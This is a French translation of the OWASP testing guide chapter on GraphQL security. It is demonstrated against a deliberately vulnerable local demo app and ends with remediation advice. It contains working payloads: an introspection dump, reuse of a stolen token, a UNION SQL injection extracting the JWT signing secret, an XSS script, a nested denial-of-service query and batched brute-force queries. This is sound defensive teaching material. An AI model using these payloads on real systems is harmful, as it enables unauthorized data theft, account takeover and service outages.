# Tester GraphQL

|ID          |
|------------|
|WSTG-APIT-01|

## Sommaire

GraphQL est devenu très populaire dans les API modernes. Il offre une simplicité et des objets imbriqués, qui facilitent un développement plus rapide. Bien que chaque technologie présente des avantages, elle peut également exposer l'application à de nouvelles surfaces d'attaque. Le but de ce scénario est de fournir des erreurs de configuration et des vecteurs d'attaque courants sur les applications qui utilisent GraphQL. Certains vecteurs sont propres à GraphQL (par exemple [Introspection Query](#introspection-queries)) et certains sont génériques pour les API (par exemple [SQL injection](#sql-injection)).

Les exemples de cette section seront basés sur une application GraphQL vulnérable [poc-graphql](https://github.com/righettod/poc-graphql), qui est exécutée dans un conteneur docker qui mappe `localhost:8080/GraphQL` comme le nœud GraphQL vulnérable.

## Objectifs des tests

- Évaluer qu'une configuration sécurisée et prête pour la production est déployée.
- Validez tous les champs de saisie contre les attaques génériques.
- S'assurer que les contrôles d'accès appropriés sont appliqués.

## Comment tester

Le test des nœuds GraphQL n'est pas très différent du test d'autres technologies API. Considérez les étapes suivantes :

### Requêtes d'introspection

Les requêtes d'introspection sont la méthode par laquelle GraphQL vous permet de demander quelles requêtes sont prises en charge, quels types de données sont disponibles et bien d'autres détails dont vous aurez besoin à l'approche d'un test de déploiement GraphQL.

Le [site Web de GraphQL décrit l'introspection] (https://graphql.org/learn/introspection/) :

> "Il est souvent utile de demander à un schéma GraphQL des informations sur les requêtes qu'il prend en charge. GraphQL nous permet de le faire en utilisant le système d'introspection !"

Il existe plusieurs façons d'extraire ces informations et de visualiser le résultat, comme suit.

#### Utilisation de l'introspection native GraphQL

Le moyen le plus simple consiste à envoyer une requête HTTP (à l'aide d'un proxy personnel) avec la charge utile suivante, tirée d'un article sur [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Le résultat sera généralement très long (et a donc été raccourci ici), et il contiendra l'intégralité du schéma du déploiement de GraphQL.

Réponse :

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Un outil tel que [GraphQL Voyager](https://apis.guru/graphql-voyager/) peut être utilisé pour mieux comprendre le point de terminaison GraphQL :

![GraphQL Voyager](images/Voyager.png)\
*Figure 12.1-1 : GraphQL Voyager*

Cet outil crée une représentation Entity Relationship Diagram (ERD) du schéma GraphQL, vous permettant de mieux voir les parties mobiles du système que vous testez. L'extraction des informations du dessin vous permet de voir que vous pouvez interroger la table Dog par exemple. Il montre également les propriétés d'un chien :

- ID
- Nom
- vétérinaire (ID)

Il y a un inconvénient à utiliser cette méthode : GraphQL Voyager n'affiche pas tout ce qui peut être fait avec GraphQL. Par exemple, les mutations disponibles ne sont pas répertoriées dans le dessin ci-dessus. Une meilleure stratégie consisterait à utiliser à la fois Voyager et l'une des méthodes répertoriées ci-dessous.

#### Utiliser GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) est un IDE basé sur le Web pour GraphQL. Il fait partie du projet GraphQL et est principalement utilisé à des fins de débogage ou de développement. La meilleure pratique consiste à ne pas autoriser les utilisateurs à y accéder sur les déploiements de production. Si vous testez un environnement intermédiaire, vous pouvez y avoir accès et ainsi gagner du temps lorsque vous travaillez avec des requêtes d'introspection (bien que vous puissiez, bien sûr, utiliser l'introspection dans l'interface GraphiQL).

GraphiQL a une section de documentation, qui utilise les données du schéma afin de créer un document de l'instance GraphQL qui est utilisée. Ce document contient les types de données, les mutations et essentiellement toutes les informations pouvant être extraites à l'aide de l'introspection.

#### Utilisation de GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) est un client GraphQL. Il peut être utilisé pour tester différentes requêtes, ainsi que pour diviser les IDE GraphQL en différents terrains de jeux et les regrouper par thème ou en leur attribuant un nom. Tout comme GraphiQL, Playground peut créer une documentation pour vous sans avoir besoin d'envoyer manuellement des requêtes d'introspection et de traiter la ou les réponses. Il a un autre grand avantage : il n'a pas besoin de l'interface GraphiQL pour être disponible. Vous pouvez diriger l'outil vers le nœud GraphQL via une URL ou l'utiliser localement avec un fichier de données. GraphQL Playground peut être utilisé pour tester directement les vulnérabilités, vous n'avez donc pas besoin d'utiliser un proxy personnel pour envoyer des requêtes HTTP. Cela signifie que vous pouvez utiliser cet outil pour une interaction simple avec et une évaluation de GraphQL. Pour d'autres charges utiles plus avancées, utilisez un proxy personnel.

Notez que dans certains cas, vous devrez définir les en-têtes HTTP en bas, pour inclure l'ID de session ou un autre mécanisme d'authentification. Cela permet toujours de créer plusieurs "IDE" avec différentes autorisations pour vérifier s'il y a effectivement des problèmes d'autorisation.

![Playground1](images/Playground1.png)\
*Figure 12.1-2 : Documentation de l'API de haut niveau de GraphQL Playground*

![Playground2](images/Playground2.png)\
*Figure 12.1-3 : Schéma de l'API GraphQL Playground*

Vous pouvez même télécharger les schémas à utiliser dans Voyager.

#### Introspection Conclusion

L'introspection est un outil utile qui permet aux utilisateurs d'obtenir plus d'informations sur le déploiement de GraphQL. Cependant, cela permettra également aux utilisateurs malveillants d'accéder aux mêmes informations. La meilleure pratique consiste à limiter l'accès aux requêtes d'introspection, car certains outils ou requêtes peuvent échouer si cette fonctionnalité est complètement désactivée. Comme GraphQL relie généralement les API back-end du système, il est préférable d'appliquer un contrôle d'accès strict.

### Autorisation

L'introspection est le premier endroit où rechercher les problèmes d'autorisation. Comme indiqué, l'accès à l'introspection devrait être limité car il permet l'extraction et la collecte de données. Une fois qu'un testeur a accès au schéma et connaît les informations sensibles à extraire, il doit alors envoyer des requêtes qui ne seront pas bloquées en raison de privilèges insuffisants. GraphQL n'applique pas les autorisations par défaut, et c'est donc à l'application d'effectuer l'application des autorisations.

Dans les exemples précédents, la sortie de la requête d'introspection montre qu'il existe une requête appelée "auth". Cela semble être un bon endroit pour extraire des informations sensibles telles que des jetons d'API, des mots de passe, etc.

![Requête d'authentification GraphQL](images/auth1.png)\
*Figure 12.1-4 : API de requête d'authentification GraphQL*

Le test de l'implémentation de l'autorisation varie d'un déploiement à l'autre, car chaque schéma aura des informations sensibles différentes et, par conséquent, des cibles différentes sur lesquelles se concentrer.

Dans cet exemple vulnérable, chaque utilisateur (même non authentifié) peut accéder aux jetons d'authentification de chaque vétérinaire répertorié dans la base de données. Ces jetons peuvent être utilisés pour effectuer des actions supplémentaires autorisées par le schéma, telles que l'association ou la dissociation d'un chien de tout vétérinaire spécifié à l'aide de mutations, même s'il n'y a pas de jeton d'authentification correspondant pour le vétérinaire dans la demande.

Voici un exemple dans lequel le testeur utilise un jeton extrait qu'il ne possède pas pour effectuer une action en tant que vétérinaire "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

Et la réponse :

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

Tous les chiens de la liste appartiennent à Benoit, et non au propriétaire du jeton d'authentification. Il est possible d'effectuer ce type d'action lorsque l'application de l'autorisation appropriée n'est pas mise en œuvre.

### Injection

GraphQL est l'implémentation de la couche API d'une application, et en tant que telle, elle transmet généralement les requêtes à une API back-end ou directement à la base de données. Cela vous permet d'utiliser toute vulnérabilité sous-jacente telle que l'injection SQL, l'injection de commandes, les scripts intersites, etc. L'utilisation de GraphQL ne fait que modifier le point d'entrée de la charge utile malveillante.

Vous pouvez vous référer à d'autres scénarios dans le guide de test OWASP pour avoir des idées.

GraphQL a également des scalaires, qui sont généralement utilisés pour les types de données personnalisés qui n'ont pas de types de données natifs, tels que DateTime. Ces types de données n'ont pas de validation prête à l'emploi, ce qui en fait de bons candidats pour les tests.

#### Injection SQL

L'exemple d'application est vulnérable par conception dans la requête `dogs(namePrefix: String, limit: Int = 500): [Dog!]` car le paramètre `namePrefix` est concaténé dans la requête SQL. La concaténation des entrées utilisateur est une mauvaise pratique courante des applications qui peuvent les exposer à l'injection SQL.

La requête suivante extrait les informations de la table `CONFIG` de la base de données :

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

La réponse à cette requête est :

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

La requête contient le secret qui signe les JWT dans l'exemple d'application, qui est une information très sensible.

Afin de savoir ce qu'il faut rechercher dans une application particulière, il sera utile de collecter des informations sur la manière dont l'application est construite et sur la manière dont les tables de la base de données sont organisées. Vous pouvez également utiliser des outils comme `sqlmap` pour rechercher des chemins d'injection et même automatiser l'extraction de données de la base de données.

#### Script intersite (XSS)

Les scripts intersites se produisent lorsqu'un attaquant injecte un code exécutable qui est ensuite exécuté par le navigateur. En savoir plus sur les tests pour XSS dans le chapitre [Input Validation](../07-Input_Validation_Testing/README.md). Vous pouvez tester le XSS reflété à l'aide d'une charge utile de [Testing for Reflected Cross Site Scripting](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

Dans cet exemple, les erreurs peuvent refléter l'entrée et entraîner l'apparition de XSS.

Charge utile :

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Réponse :

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Requêtes de déni de service (DoS)

GraphQL expose une interface très simple pour permettre aux développeurs d'utiliser des requêtes imbriquées et des objets imbriqués. Cette capacité peut également être utilisée de manière malveillante, en appelant une requête imbriquée profonde similaire à une fonction récursive et en provoquant un déni de service en utilisant le processeur, la mémoire ou d'autres ressources de calcul.

En regardant *Figure 12.1-1*, vous pouvez voir qu'il est possible de créer une boucle où un objet Dog contient un objet Veterinary. Il pourrait y avoir une quantité infinie d'objets imbriqués.

Cela permet une requête approfondie qui a le potentiel de surcharger l'application :

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Plusieurs mesures de sécurité peuvent être mises en œuvre pour empêcher ces types de requêtes, répertoriées dans la section [Remediation](#remediation). Les requêtes abusives peuvent causer des problèmes tels que DoS pour les déploiements GraphQL et doivent être incluses dans les tests.

### Attaques groupées

GraphQL prend en charge le regroupement de plusieurs requêtes en une seule requête. Cela permet aux utilisateurs de demander efficacement plusieurs objets ou plusieurs instances d'objets. Cependant, un attaquant peut utiliser cette fonctionnalité afin d'effectuer une attaque par lots. L'envoi de plusieurs requêtes dans une même requête ressemble à ceci :

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

Dans l'exemple d'application, une seule requête peut être envoyée afin d'extraire tous les noms vétérinaires à l'aide de l'ID devinable (c'est un entier croissant). Un attaquant peut alors utiliser les noms afin d'obtenir des jetons d'accès. Au lieu de le faire dans de nombreuses requêtes, qui peuvent être bloquées par une mesure de sécurité réseau comme un pare-feu d'application Web ou un limiteur de débit comme Nginx, ces requêtes peuvent être regroupées. Cela signifie qu'il n'y aurait que quelques requêtes, ce qui peut permettre un forçage brutal efficace sans être détecté. Voici un exemple de requête :

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Cela fournira à l'attaquant les noms des vétérinaires et, comme indiqué précédemment, les noms peuvent être utilisés pour regrouper plusieurs requêtes demandant les jetons d'authentification de ces vétérinaires. Par exemple :

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Les attaques par lots peuvent être utilisées pour contourner de nombreuses mesures de sécurité appliquées sur les sites Web. Il peut également être utilisé pour énumérer des objets et tenter de forcer brutalement l'authentification multifacteur ou d'autres informations sensibles.

### Message d'erreur détaillé

GraphQL peut rencontrer des erreurs inattendues lors de l'exécution. Lorsqu'une telle erreur se produit, le serveur peut envoyer une réponse d'erreur qui peut révéler des détails d'erreur interne ou des configurations ou des données d'application. Cela permet à un utilisateur malveillant d'acquérir plus d'informations sur l'application. Dans le cadre des tests, les messages d'erreur doivent être vérifiés en envoyant des données inattendues, un processus connu sous le nom de fuzzing. Les réponses doivent être recherchées pour des informations potentiellement sensibles qui peuvent être révélées à l'aide de cette technique.

### Exposition de l'API sous-jacente

GraphQL est une technologie relativement nouvelle, et certaines applications passent d'anciennes API à GraphQL. Dans de nombreux cas, GraphQL est déployé en tant qu'API standard qui traduit les requêtes (envoyées à l'aide de la syntaxe GraphQL) vers une API sous-jacente, ainsi que les réponses. Si les demandes adressées à l'API sous-jacente ne sont pas correctement vérifiées pour l'autorisation, cela pourrait entraîner une éventuelle élévation des privilèges.

Par exemple, une requête contenant le paramètre `id=1/delete` peut être interprétée comme `/api/users/1/delete`. Cela pourrait s'étendre à la manipulation d'autres ressources appartenant à `user=1`. Il est également possible que la demande soit interprétée comme ayant l'autorisation donnée au nœud GraphQL, au lieu du véritable demandeur.

Un testeur doit essayer d'accéder aux méthodes API sous-jacentes car il peut être possible d'élever les privilèges.

## Correction

- Restreindre l'accès aux requêtes d'introspection.
- Mettre en œuvre la validation des entrées.
    - GraphQL n'a pas de moyen natif de valider les entrées, cependant, il existe un projet open source appelé ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) qui permet validation des entrées dans le cadre de la définition du schéma.
    - La validation des entrées seule est utile, mais ce n'est pas une solution complète et des mesures supplémentaires doivent être prises pour atténuer les attaques par injection.
- Mettre en place des mesures de sécurité pour éviter les requêtes abusives.
    - Délais d'attente : restreignez la durée pendant laquelle une requête est autorisée à s'exécuter.
    - Profondeur de requête maximale : limitez la profondeur des requêtes autorisées, ce qui peut empêcher les requêtes trop profondes d'abuser des ressources.
    - Définir la complexité maximale des requêtes : limitez la complexité des requêtes pour atténuer l'abus des ressources GraphQL.
    - Utilisez la limitation basée sur le temps du serveur : limitez la quantité de temps de serveur qu'un utilisateur peut consommer.
    - Utilisez la limitation basée sur la complexité des requêtes : limitez la complexité totale des requêtes qu'un utilisateur peut consommer.
- Envoyer des messages d'erreur génériques : utilisez des messages d'erreur génériques qui ne révèlent pas les détails du déploiement.
- Atténuez les attaques par lots :
    - Ajouter une limitation du taux de requête d'objet dans le code.
    - Empêcher le regroupement d'objets sensibles.
    - Limitez le nombre de requêtes pouvant être exécutées en même temps.

Pour en savoir plus sur la correction des faiblesses de GraphQL, reportez-vous à [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Outils

- [Terrain de jeu GraphQL](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp Extension)] (https://portswigger.net/bappstore/296e9a0730384be4b2ffffef7b4e19b1f)
- [GraphQL Raider (extension Burp)] (https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on pour OWASP ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## Références

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [Site officiel de GraphQL](https://graphql.org/learn/)
- [Howtographql - Sécurité](https://www.howtographql.com/advanced/4-security/)
- [Directive de contrainte GraphQL] (https://github.com/confuser/graphql-constraint-directive)
- [Test côté client](../11-Client-side_Testing/README.md) (XSS et autres vulnérabilités)
- [5 vulnérabilités de sécurité courantes de GraphQL] (https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [Les vulnérabilités courantes de GraphQL et comment les exploiter](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
